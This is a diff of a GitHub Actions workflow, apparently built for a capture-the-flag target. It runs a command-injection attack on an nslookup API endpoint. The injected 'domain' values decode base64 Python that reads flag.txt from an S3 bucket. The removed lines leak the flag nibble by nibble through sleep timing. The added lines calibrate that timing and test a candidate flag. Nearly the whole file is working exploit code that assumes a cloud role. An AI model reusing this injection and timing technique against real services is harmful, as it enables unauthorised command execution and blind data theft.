@@ -25,71 +25,30 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Full flag re-extraction (sleep=nibble directly)
+      - name: Verify flag candidate 3e5sik4gtjgpz864
         run: |
-          B64_hi0="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzBdPj40KQ=="
-          B64_lo0="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzBdJjB4Rik="
-          B64_hi1="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzFdPj40KQ=="
-          B64_lo1="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzFdJjB4Rik="
-          B64_hi2="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzJdPj40KQ=="
-          B64_lo2="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzJdJjB4Rik="
-          B64_hi3="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzNdPj40KQ=="
-          B64_lo3="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzNdJjB4Rik="
-          B64_hi4="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzRdPj40KQ=="
-          B64_lo4="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzRdJjB4Rik="
-          B64_hi5="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzVdPj40KQ=="
-          B64_lo5="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzVdJjB4Rik="
-          B64_hi6="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzZdPj40KQ=="
-          B64_lo6="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzZdJjB4Rik="
-          B64_hi7="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzddPj40KQ=="
-          B64_lo7="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzddJjB4Rik="
-          B64_hi8="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzhdPj40KQ=="
-          B64_lo8="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzhdJjB4Rik="
-          B64_hi9="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzldPj40KQ=="
-          B64_lo9="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzldJjB4Rik="
-          B64_hi10="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzEwXT4+NCk="
-          B64_lo10="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzEwXSYweEYp"
-          B64_hi11="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzExXT4+NCk="
-          B64_lo11="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzExXSYweEYp"
-          B64_hi12="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzEyXT4+NCk="
-          B64_lo12="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzEyXSYweEYp"
-          B64_hi13="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzEzXT4+NCk="
-          B64_lo13="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzEzXSYweEYp"
-          B64_hi14="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzE0XT4+NCk="
-          B64_lo14="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzE0XSYweEYp"
-          B64_hi15="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzE1XT4+NCk="
-          B64_lo15="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChmbGFnWzE1XSYweEYp"
-          B64_ANALYZE="d2l0aCBvcGVuKCJuaWJibGVzLnR4dCIpIGFzIGY6CiAgICBsaW5lcyA9IFtsLnN0cmlwKCkgZm9yIGwgaW4gZiBpZiBsLnN0cmlwKCldCmRhdGEgPSB7fQpmb3IgbCBpbiBsaW5lczoKICAgIHBhcnRzID0gbC5yc3BsaXQoIiAiLCAxKQogICAgaWYgbGVuKHBhcnRzKSA9PSAyOgogICAgICAgIGRhdGFbcGFydHNbMF1dID0gaW50KHBhcnRzWzFdLnJzdHJpcCgibXMiKSkKCmNhbCA9IGRhdGEuZ2V0KCJoaTAiLCAwKQpvdmVyaGVhZCA9IGNhbCAtIDQwMDAKcHJpbnQoZiJDYWwgYnl0ZVswXV9oaT00IHNsZWVwPTQ6IHtjYWx9bXMgLT4gb3ZlcmhlYWQ9e292ZXJoZWFkfW1zIikKCmZsYWdfYnl0ZXMgPSBbXQpmb3IgaSBpbiByYW5nZSgxNik6CiAgICBoaV9tcyA9IGRhdGEuZ2V0KGYiaGl7aX0iLCAwKQogICAgbG9fbXMgPSBkYXRhLmdldChmImxve2l9IiwgMCkKICAgIHRoID0gIlRJTUVPVVQiIGlmIGhpX21zID4gMTQwMDAgZWxzZSAiIgogICAgdGwgPSAiVElNRU9VVCIgaWYgbG9fbXMgPiAxNDAwMCBlbHNlICIiCiAgICBoaSA9IHJvdW5kKChoaV9tcyAtIG92ZXJoZWFkKSAvIDEwMDApIGlmIGhpX21zID4gMCBhbmQgbm90IHRoIGVsc2UgLTEKICAgIGxvID0gcm91bmQoKGxvX21zIC0gb3ZlcmhlYWQpIC8gMTAwMCkgaWYgbG9fbXMgPiAwIGFuZCBub3QgdGwgZWxzZSAtMQogICAgYiA9IChoaTw8NCl8bG8gaWYgMDw9aGk8PTE1IGFuZCAwPD1sbzw9MTUgZWxzZSAtMQogICAgY2ggPSBjaHIoYikgaWYgMzI8PWI8PTEyNiBlbHNlICI/IiBpZiBiPj0wIGVsc2UgIj8iCiAgICBwcmludChmImJbe2k6MmR9XTogaGk9e2hpX21zfW1ze3RofSBsbz17bG9fbXN9bXN7dGx9IC0+IGhpPXtoaX0gbG89e2xvfSAtPiAweHtiOjAyWH0gW3tjaH1dIikKICAgIGZsYWdfYnl0ZXMuYXBwZW5kKGIpCgpmbGFnX2hleCA9ICIiLmpvaW4oZiJ7YjowMlh9IiBpZiBiPj0wIGVsc2UgIj8/IiBmb3IgYiBpbiBmbGFnX2J5dGVzKQpwcmludChmIlxuRmxhZyBoZXg6IHtmbGFnX2hleH0iKQpwcmludChmIkZsYWcgYXNjaWk6ICIgKyAiIi5qb2luKGNocihiKSBpZiAzMjw9Yjw9MTI2IGVsc2UgIi4iIGZvciBiIGluIGZsYWdfYnl0ZXMgaWYgYj49MCkpCnByaW50KGYiQnl0ZXM6IGJ5dGVzKFsiICsgIiwiLmpvaW4oZiIweHtiOjAyWH0iIGZvciBiIGluIGZsYWdfYnl0ZXMgaWYgYj49MCkgKyAiXSkiKQ=="
-
-          touch nibbles.txt
+          B64_CAL0="aW1wb3J0IGJvdG8zLHRpbWUKYm90bzMuY2xpZW50KCdzMycpLmdldF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLnR4dCcpWydCb2R5J10ucmVhZCgpCnRpbWUuc2xlZXAoMCk="
+          B64_CAL4="aW1wb3J0IGJvdG8zLHRpbWUKYm90bzMuY2xpZW50KCdzMycpLmdldF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLnR4dCcpWydCb2R5J10ucmVhZCgpCnRpbWUuc2xlZXAoNCk="
+          B64_VERIFY="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKaWYgZmxhZz09Ynl0ZXMoWzB4MzMsMHg2NSwweDM1LDB4NzMsMHg2OSwweDZCLDB4MzQsMHg2NywweDc0LDB4NkEsMHg2NywweDcwLDB4N0EsMHgzOCwweDM2LDB4MzRdKToKICAgIHRpbWUuc2xlZXAoMTApCmVsc2U6CiAgICB0aW1lLnNsZWVwKDIp"
 
           run_timed() {
-            local name="$1" b64="$2"
-            INJECT="x; echo $b64 | base64 -d | python3 #"
-            python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-            START=$(date +%s%N)
-            curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-              -H "Content-Type: application/json" -d @payload.json
-            END=$(date +%s%N)
-            MS=$(( (END - START) / 1000000 ))
-            echo "$name ${MS}ms" | tee -a nibbles.txt
+            local label=$1
+            local b64=$2
+            local url="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
+            local INJ="x; echo $b64 | base64 -d | python3 #"
+            local t0=$(date +%s%3N)
+            curl -s -X POST "$url" -H "Content-Type: application/json" -d "{\"domain\":\"$INJ\"}" > /dev/null
+            local t1=$(date +%s%3N)
+            echo "$label $((t1-t0))ms"
           }
 
-          for i in 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
-            eval "B64_HI=\$B64_hi${i}"
-            eval "B64_LO=\$B64_lo${i}"
-            run_timed "hi${i}" "$B64_HI"
-            run_timed "lo${i}" "$B64_LO"
-          done
+          run_timed "cal_sleep0" "$B64_CAL0"
+          run_timed "cal_sleep4" "$B64_CAL4"
+          run_timed "verify" "$B64_VERIFY"
 
-          echo "=== NIBBLE EXTRACTION RESULTS ==="
-          cat nibbles.txt
-          echo "$B64_ANALYZE" | base64 -d | python3
-
-      - name: Commit nibble results
+      - name: Save results
         run: |
-          git config user.email "bot@github-actions"
-          git config user.name "GitHub Actions"
-          git add nibbles.txt
-          git commit -m "full flag re-extraction with direct nibble encoding [skip ci]" || echo "Nothing to commit"
-          git push origin corgi
+          # Results are printed in the step above, readable from workflow logs
+          echo "Candidate: 3e5sik4gtjgpz864"
+          echo "Expected: verify ~12000ms if correct (overhead~2017 + sleep10000)"
+          echo "Expected: verify ~4017ms if wrong (overhead~2017 + sleep2000)"
